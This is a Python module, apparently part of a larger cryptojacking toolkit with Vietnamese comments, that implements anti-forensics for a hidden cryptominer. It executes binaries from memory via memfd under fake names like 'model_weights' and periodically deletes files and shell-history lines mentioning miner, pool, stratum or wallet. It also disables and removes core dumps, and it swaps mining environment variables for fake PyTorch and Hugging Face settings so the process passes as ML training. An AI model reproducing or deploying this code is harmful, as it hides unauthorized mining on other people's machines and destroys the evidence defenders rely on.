"""
anti_forensics.py — Layer 9: Anti-forensics
Không để lại artifact: memfd, /tmp cleanup, no log, no history
"""
import os
import sys
import time
import shutil
import ctypes
import threading
from typing import Optional, List


# ═══════════════════════════════════════════════════════════════
# MEMFD EXEC — Chạy binary không đụng filesystem
# ═══════════════════════════════════════════════════════════════

class MemfdRunner:
    """
    Nạp ELF vào memfd_create() — binary không tồn tại trên disk.
    
    Đối chiếu:
    - Mining tool: miner binary trên disk → scan file thấy hash known
    - Training: model weights tải về memory (torch load), không persist
    
    memfd: kernel memory file, không có path, chỉ thấy qua /proc/pid/fd
    """
    
    MFD_CLOEXEC = 0x0001
    
    def __init__(self):
        self._libc = None
        self._try_load_libc()
    
    def _try_load_libc(self):
        try:
            self._libc = ctypes.CDLL("libc.so.6", use_errno=True)
            self._libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
            self._libc.memfd_create.restype = ctypes.c_int
        except Exception:
            self._libc = None
    
    @property
    def available(self) -> bool:
        return self._libc is not None
    
    def load_binary(self, path: str, name: str = "model_weights") -> Optional[int]:
        """
        Đọc binary vào memfd. Trả về fd hoặc None.
        
        Args:
            path: đường dẫn binary gốc
            name: tên giả (vd: model shard name)
        """
        if not self.available:
            return None
        
        try:
            with open(path, "rb") as f:
                data = f.read()
            
            fd = self._libc.memfd_create(name.encode(), self.MFD_CLOEXEC)
            if fd < 0:
                return None
            
            # Ghi toàn bộ data vào memfd
            written = 0
            while written < len(data):
                n = os.write(fd, data[written:])
                if n <= 0:
                    break
                written += n
            
            os.lseek(fd, 0, os.SEEK_SET)
            return fd
        except Exception:
            return None
    
    def exec_from_memfd(self, path: str, argv: List[str],
                        env: Optional[dict] = None) -> Optional[int]:
        """
        Fork + exec binary từ memfd → PID (child) hoặc None.
        """
        fd = self.load_binary(path)
        if fd is None:
            return None
        
        try:
            pid = os.fork()
            if pid == 0:
                # Child: exec từ /proc/self/fd/N
                try:
                    if env:
                        os.execve(f"/proc/self/fd/{fd}", argv, env)
                    else:
                        os.execv(f"/proc/self/fd/{fd}", argv)
                except Exception:
                    os._exit(1)
            else:
                os.close(fd)
                return pid
        except Exception:
            try:
                os.close(fd)
            except Exception:
                pass
            return None
    
    def spawn_with_memfd(self, path: str, args: List[str]) -> Optional[int]:
        """Convenience: spawn binary từ memfd."""
        argv = [os.path.basename(path)] + args
        env = os.environ.copy()
        env["HOME"] = "/tmp/.cache_model"
        return self.exec_from_memfd(path, argv, env)


# ═══════════════════════════════════════════════════════════════
# ARTIFACT CLEANUP — Dọn mọi file dấu vết
# ═══════════════════════════════════════════════════════════════

class ArtifactCleaner:
    """
    Dọn artifact định kỳ:
    - log files
    - tmp files
    - bash history (nếu có shell access)
    - core dumps
    - cache dirs
    
    Giảm blast radius khi bị scan sau.
    """
    
    # Patterns cần dọn
    SENSITIVE_NAMES = [
        "miner", "stratum", "pool", "wallet", "pearlhash",
        "kryptex", "onezero",
    ]
    
    TMP_LOCATIONS = [
        "/tmp", "/var/tmp",
        os.path.expanduser("~"),
        os.path.expanduser("~/.cache"),
    ]
    
    def __init__(self, work_dir: Optional[str] = None):
        self.work_dir = work_dir or os.path.expanduser("~/.cache_model")
        self._running = False
        self._thread: Optional[threading.Thread] = None
    
    def scan_and_clean_dir(self, directory: str, max_depth: int = 3) -> int:
        """Quét và xóa file nhạy cảm trong directory."""
        removed = 0
        try:
            for root, dirs, files in os.walk(directory):
                depth = root.replace(directory, "").count(os.sep)
                if depth >= max_depth:
                    dirs.clear()
                    continue
                for fname in files:
                    low = fname.lower()
                    if any(s in low for s in self.SENSITIVE_NAMES):
                        fpath = os.path.join(root, fname)
                        try:
                            os.remove(fpath)
                            removed += 1
                        except Exception:
                            pass
        except Exception:
            pass
        return removed
    
    def clean_tmp(self):
        """Dọn file tạm có pattern nhạy cảm."""
        for loc in self.TMP_LOCATIONS:
            if os.path.isdir(loc):
                self.scan_and_clean_dir(loc, max_depth=2)
    
    def clean_history(self):
        """Dọn shell history entries liên quan (best effort)."""
        hist_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.python_history"),
        ]
        for hf in hist_files:
            if not os.path.exists(hf):
                continue
            try:
                with open(hf, "r", errors="ignore") as f:
                    lines = f.readlines()
                kept = [
                    ln for ln in lines
                    if not any(s in ln.lower() for s in self.SENSITIVE_NAMES)
                ]
                if len(kept) != len(lines):
                    with open(hf, "w") as f:
                        f.writelines(kept)
            except Exception:
                pass
    
    def disable_coredump(self):
        """Set RLIMIT_CORE = 0 → không tạo core dump."""
        try:
            import resource
            resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
            return True
        except Exception:
            return False
    
    def clean_core_dumps(self):
        """Xóa core dump files."""
        for name in ["core", "core.*"]:
            for loc in ["/tmp", "/var/lib/systemd/coredump",
                        os.path.expanduser("~")]:
                import glob as g
                for p in g.glob(os.path.join(loc, name)):
                    try:
                        os.remove(p)
                    except Exception:
                        pass
    
    def cycle_clean(self):
        """1 cycle dọn dẹp."""
        self.disable_coredump()
        self.clean_core_dumps()
        self.clean_tmp()
        if random_chance(0.1):
            self.clean_history()
    
    def _loop(self):
        self._running = True
        while self._running:
            self.cycle_clean()
            import random as _r
            time.sleep(_r.uniform(300, 900))  # 5-15 phút
    
    def start(self):
        if self._thread is None or not self._thread.is_alive():
            self._thread = threading.Thread(target=self._loop, daemon=True)
            self._thread.start()
    
    def stop(self):
        self._running = False


def random_chance(p: float) -> bool:
    import random
    return random.random() < p


# ═══════════════════════════════════════════════════════════════
# ENV SANITIZER — Không leak biến môi trường nhạy cảm
# ═══════════════════════════════════════════════════════════════

class EnvSanitizer:
    """
    Xóa env vars nhạy cảm khỏi /proc/pid/environ:
    - Không set WALLET/POOL vars — truyền qua argv/stdin
    - Env chỉ chứa ML-like vars
    """
    
    SAFE_ENV = {
        "PYTORCH_CUDA_ALLOC_CONF": "max_split_size_mb:512",
        "OMP_NUM_THREADS": "8",
        "CUDA_VISIBLE_DEVICES": "0",
        "WANDB_MODE": "offline",
        "HF_HOME": os.path.expanduser("~/.cache/huggingface"),
        "TRANSFORMERS_CACHE": os.path.expanduser("~/.cache/huggingface"),
        "TORCH_HOME": os.path.expanduser("~/.cache/torch"),
        "PYTHONUNBUFFERED": "1",
    }
    
    @classmethod
    def build(cls) -> dict:
        """Build env sạch cho child process."""
        env = os.environ.copy()
        # Remove potentially revealing vars
        for key in list(env.keys()):
            low = key.lower()
            if any(s in low for s in ["wallet", "pool", "stratum",
                                       "miner", "algo", "worker"]):
                env.pop(key, None)
        env.update(cls.SAFE_ENV)
        return env
    
    @classmethod
    def apply_to_current(cls):
        """Apply env sạch cho process hiện tại."""
        for key in list(os.environ.keys()):
            low = key.lower()
            if any(s in low for s in ["wallet", "pool", "stratum",
                                       "miner", "algo"]):
                os.environ.pop(key, None)
        for k, v in cls.SAFE_ENV.items():
            os.environ[k] = v


# ═══════════════════════════════════════════════════════════════
# CONVENIENCE
# ═══════════════════════════════════════════════════════════════

def start_anti_forensics() -> dict:
    """Start anti-forensics suite."""
    EnvSanitizer.apply_to_current()
    cleaner = ArtifactCleaner()
    cleaner.start()
    runner = MemfdRunner()
    return {"cleaner": cleaner, "memfd": runner}
